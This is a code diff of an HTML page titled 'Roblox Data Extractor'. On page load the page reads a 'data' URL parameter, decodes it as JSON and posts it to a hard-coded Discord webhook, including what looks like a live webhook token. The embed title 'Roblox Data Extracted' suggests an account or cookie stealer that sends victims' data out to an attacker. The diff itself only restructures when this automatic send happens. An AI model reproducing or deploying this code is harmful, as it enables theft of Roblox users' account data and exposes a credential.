@@ -5,14 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Data Extractor</title>
     <script>
-        function getQueryParam(name) {
+        window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(name);
-        }
+            const data = urlParams.get('data');
+            
+            if (data) {
+                try {
+                    const message = JSON.parse(decodeURIComponent(data));
+                    sendWebhook(message); // Send the extracted data to the webhook
+                } catch (error) {
+                    console.error('Error parsing data:', error);
+                }
+            }
+        };
 
         function sendWebhook(message) {
             const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
-            
+
             const embed = {
                 "embeds": [{
                     "title": "Roblox Data Extracted",
@@ -73,20 +82,6 @@
                 console.error('Request failed', error);
             });
         }
-
-        function extractData() {
-            const data = getQueryParam('data');
-            if (data) {
-                try {
-                    const message = JSON.parse(decodeURIComponent(data));
-                    sendWebhook(message); // Send the extracted data to the webhook
-                } catch (error) {
-                    console.error('Error parsing data:', error);
-                }
-            }
-        }
-
-        window.onload = extractData; // Automatically send the webhook when the page is loaded
     </script>
 </head>
 <body>
